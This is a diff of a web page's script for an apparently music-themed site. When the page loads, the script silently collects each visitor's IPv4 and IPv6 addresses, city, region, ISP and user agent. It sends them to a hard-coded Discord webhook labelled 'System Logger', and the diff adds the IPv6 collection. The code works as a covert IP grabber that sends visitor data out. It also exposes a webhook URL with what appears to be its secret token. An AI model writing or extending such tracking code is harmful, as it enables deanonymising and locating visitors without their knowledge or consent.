@@ -356,7 +356,8 @@
         <div id="top-ip-display" class="status-text-block">
             الدولة: جاري التحميل...<br>
             المدينة: جاري التحميل...<br>
-            IP: جاري التحميل...
+            IPv4: جاري التحميل...<br>
+            IPv6: جاري التحميل...
         </div>
     </div>
 
@@ -404,7 +405,7 @@
 
     <script>
         // ================================================================
-        //  [التحسينات] الجزء الأول: دوال الجلب المتقدمة
+        //  [التحسينات] الجزء الأول: دوال جلب IPv4 و IPv6 مع مهلة زمنية
         // ================================================================
 
         let currentNetworkData = {};
@@ -429,56 +430,116 @@
                 });
         }
 
-        // قائمة الخدمات مع دوال "محلل" (Parser) لتوحيد المخرجات
-        const API_SOURCES = [{
-            url: 'https://ipapi.co/json/',
-            parser: (data) => ({
-                ip: data.ip || 'غير معروف',
-                country: data.country_name || data.country || 'غير معروف',
-                region: data.region || 'غير معروف',
-                city: data.city || 'غير معروف',
-                isp: data.org || data.isp || 'غير معروف'
-            })
-        }, {
-            url: 'https://ipwho.is/',
-            parser: (data) => ({
-                ip: data.ip || 'غير معروف',
-                country: data.country || 'غير معروف',
-                region: data.region || 'غير معروف',
-                city: data.city || 'غير معروف',
-                isp: data.connection?.isp || data.org || 'غير معروف'
-            })
-        }, {
-            url: 'https://extreme-ip-lookup.com/json/',
-            parser: (data) => ({
-                ip: data.query || data.ip || 'غير معروف',
-                country: data.country || 'غير معروف',
-                region: data.region || 'غير معروف',
-                city: data.city || 'غير معروف',
-                isp: data.org || data.isp || 'غير معروف'
-            })
-        }];
+        // جلب عنوان IP حسب الإصدار (v4 أو v6)
+        async function fetchIPVersion(version) {
+            const urls = {
+                v4: [
+                    'https://api.ipify.org?format=json',
+                    'https://ipv4.icanhazip.com/' // يعيد نصاً، لكن سنتعامل معه كـ fallback
+                ],
+                v6: [
+                    'https://api6.ipify.org?format=json',
+                    'https://ipv6.icanhazip.com/'
+                ]
+            };
 
-        // الدالة الرئيسية المحسنة (جلب متوازي + كاش)
+            const list = urls[version] || urls.v4;
+            // حاول استخدام api.ipify.org أولاً (JSON)، ثم النصية كـ fallback
+            for (const url of list) {
+                try {
+                    const resp = await fetchWithTimeout(url, 3000);
+                    // إذا كانت الاستجابة نصية (من icanhazip) نحولها لكائن
+                    if (typeof resp === 'string') {
+                        const ip = resp.trim();
+                        if (ip) return { ip };
+                    }
+                    // إذا كانت JSON
+                    if (resp && resp.ip) {
+                        return { ip: resp.ip };
+                    }
+                } catch (_) { /* تجاهل الخطأ وجرب التالي */ }
+            }
+            return null; // فشل جلب هذا الإصدار
+        }
+
+        // الدالة الرئيسية لجلب بيانات الشبكة (IPv4 و IPv6 + الموقع الجغرافي)
         async function fetchOptimizedNetworkData() {
             // 1. التحقق من الكاش أولاً (صلاحية ساعة واحدة)
             try {
                 const cached = localStorage.getItem('user_geo_cache');
                 if (cached) {
                     const parsed = JSON.parse(cached);
-                    if (Date.now() - parsed.timestamp < 3600000) { // أقل من ساعة
+                    if (Date.now() - parsed.timestamp < 3600000) {
                         console.log('✅ استخدام بيانات مخزنة مؤقتاً');
                         return parsed.data;
                     }
                 }
             } catch (e) { /* تجاهل خطأ الكاش */ }
 
-            // 2. تنفيذ جميع الطلبات بشكل متوازٍ
+            // 2. جلب كلا الإصدارين بشكل متوازٍ
+            const [v4Result, v6Result] = await Promise.allSettled([
+                fetchIPVersion('v4'),
+                fetchIPVersion('v6')
+            ]);
+
+            const ipv4 = v4Result.status === 'fulfilled' && v4Result.value ? v4Result.value.ip : 'غير متاح';
+            const ipv6 = v6Result.status === 'fulfilled' && v6Result.value ? v6Result.value.ip : 'غير متاح';
+
+            // 3. جلب البيانات الجغرافية (باستخدام الخدمة الأسرع)
+            const geoData = await fetchGeoLocation();
+
+            // 4. دمج النتائج
+            const result = {
+                ipv4,
+                ipv6,
+                country: geoData?.country || 'غير معروف',
+                region: geoData?.region || 'غير معروف',
+                city: geoData?.city || 'غير معروف',
+                isp: geoData?.isp || 'غير معروف'
+            };
+
+            // حفظ في الكاش مع الطابع الزمني
+            localStorage.setItem('user_geo_cache', JSON.stringify({
+                data: result,
+                timestamp: Date.now()
+            }));
+
+            console.log('✅ تم جلب البيانات بنجاح:', result);
+            return result;
+        }
+
+        // جلب الموقع الجغرافي من عدة خدمات (نفس الكود الأصلي مع تعديل بسيط)
+        async function fetchGeoLocation() {
+            const API_SOURCES = [{
+                url: 'https://ipapi.co/json/',
+                parser: (data) => ({
+                    country: data.country_name || data.country || 'غير معروف',
+                    region: data.region || 'غير معروف',
+                    city: data.city || 'غير معروف',
+                    isp: data.org || data.isp || 'غير معروف'
+                })
+            }, {
+                url: 'https://ipwho.is/',
+                parser: (data) => ({
+                    country: data.country || 'غير معروف',
+                    region: data.region || 'غير معروف',
+                    city: data.city || 'غير معروف',
+                    isp: data.connection?.isp || data.org || 'غير معروف'
+                })
+            }, {
+                url: 'https://extreme-ip-lookup.com/json/',
+                parser: (data) => ({
+                    country: data.country || 'غير معروف',
+                    region: data.region || 'غير معروف',
+                    city: data.city || 'غير معروف',
+                    isp: data.org || data.isp || 'غير معروف'
+                })
+            }];
+
             const fetchPromises = API_SOURCES.map(source =>
-                fetchWithTimeout(source.url, 4000) // مهلة 4 ثواني
+                fetchWithTimeout(source.url, 3000)
                 .then(data => {
-                    // تحقق من صحة البيانات الأساسية (تأكد أن الـ IP موجود)
-                    if (!data || (!data.ip && !data.query && !data.ip)) {
+                    if (!data || (!data.ip && !data.query && !data.country)) {
                         throw new Error('بيانات غير مكتملة');
                     }
                     return source.parser(data);
@@ -486,29 +547,18 @@
             );
 
             try {
-                // Promise.any: ترجع أول طلب ينجح (أسرع خادم)
                 const result = await Promise.any(fetchPromises);
-
-                // حفظ في الكاش مع الطابع الزمني
-                localStorage.setItem('user_geo_cache', JSON.stringify({
-                    data: result,
-                    timestamp: Date.now()
-                }));
-
-                console.log('✅ تم جلب البيانات بنجاح:', result);
                 return result;
-
             } catch (error) {
-                console.error('❌ فشلت جميع خدمات جلب الـ IP:', error);
-                return null; // أو إرجاع بيانات افتراضية
+                console.error('❌ فشلت جميع خدمات جلب الموقع:', error);
+                return null;
             }
         }
 
         // ================================================================
-        //  [التحسينات] الجزء الثاني: دوال التحديث والإرسال (مع الحفاظ على الوظائف الأصلية)
+        //  [التحسينات] الجزء الثاني: تحديث الواجهة وإرسال Webhook
         // ================================================================
 
-        // دالة تحديث الواجهة (تم تعديلها لتتناسب مع العنصر الموجود)
         function updateLocationUI(data) {
             const displayElement = document.getElementById('top-ip-display');
             if (displayElement) {
@@ -516,12 +566,12 @@
                         الدولة: ${data.country}<br>
                         المنطقة: ${data.region}<br>
                         المدينة: ${data.city}<br>
-                        IP: ${data.ip}
+                        IPv4: ${data.ipv4}<br>
+                        IPv6: ${data.ipv6}
                     `;
             }
         }
 
-        // دالة عرض وضع عدم الاتصال (في حال فشل كل شيء)
         function showOfflineUI() {
             const displayElement = document.getElementById('top-ip-display');
             if (displayElement) {
@@ -529,12 +579,13 @@
                         الدولة: فحص الشبكة...<br>
                         المنطقة: جاري التثبيت...<br>
                         المدينة: فحص الاتصال...<br>
-                        IP: اتصال خارجي آمن
+                        IPv4: جاري التحميل...<br>
+                        IPv6: جاري التحميل...
                     `;
             }
         }
 
-        // دالة إرسال البيانات إلى Webhook (مع تحذير أمني، يُفضل استخدام بروكسي)
+        // دالة إرسال البيانات إلى Webhook (مع IPv4 و IPv6)
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1522122255327297667/2Sh-s4h-GgR_BaM8eexpMzzrO_7XimZavKHcbXMPDoPbhxIV5_yF020WA3AbTssRuXR8';
 
         function sendToWebhook(data) {
@@ -543,14 +594,15 @@
                 username: "System Logger",
                 avatar_url: "",
                 embeds: [{
-                    title: "🌐 تسجيل دخول مستخدم جديد (موقع دقيق)",
+                    title: "🌐 تسجيل دخول مستخدم جديد (IPv4 & IPv6)",
                     color: 15548997,
                     fields: [
-                        { name: "📌 IP Address", value: `\`${data.ip || "Unknown"}\``, inline: false },
-                        { name: "🏳️ Country", value: data.country || "Unknown", inline: true },
-                        { name: "📍 Region", value: data.region || "Unknown", inline: true },
-                        { name: "🏙️ City", value: data.city || "Unknown", inline: true },
-                        { name: "🏢 ISP / Provider", value: data.isp || "Unknown", inline: false },
+                        { name: "📌 IPv4 Address", value: `\`${data.ipv4 || "غير متاح"}\``, inline: false },
+                        { name: "📌 IPv6 Address", value: `\`${data.ipv6 || "غير متاح"}\``, inline: false },
+                        { name: "🏳️ Country", value: data.country || "غير معروف", inline: true },
+                        { name: "📍 Region", value: data.region || "غير معروف", inline: true },
+                        { name: "🏙️ City", value: data.city || "غير معروف", inline: true },
+                        { name: "🏢 ISP / Provider", value: data.isp || "غير معروف", inline: false },
                         { name: "🖥️ User Agent", value: navigator.userAgent, inline: false }
                     ],
                     footer: { text: "Music System | " + new Date().toLocaleString('ar-EG') },
@@ -562,22 +614,22 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
-            }).catch(err => console.log('خطأ ويب هوك.'));
+            }).catch(err => console.log('خطأ ويب هوك.', err));
         }
 
         // ================================================================
-        //  [التحسينات] الجزء الثالث: استدعاء الدالة الجديدة بدلاً من القديمة
+        //  [التحسينات] الجزء الثالث: استدعاء الدالة الرئيسية
         // ================================================================
 
         async function fetchSystemNetworkData() {
             const data = await fetchOptimizedNetworkData();
 
-            if (data) {
+            if (data && data.ipv4) {
                 currentNetworkData = data;
-                updateLocationUI(data); // تحديث الواجهة
-                sendToWebhook(data); // الإرسال إلى الديسكورد
+                updateLocationUI(data);
+                sendToWebhook(data);
             } else {
-                showOfflineUI(); // وضع الفشل الكامل
+                showOfflineUI();
             }
         }
 
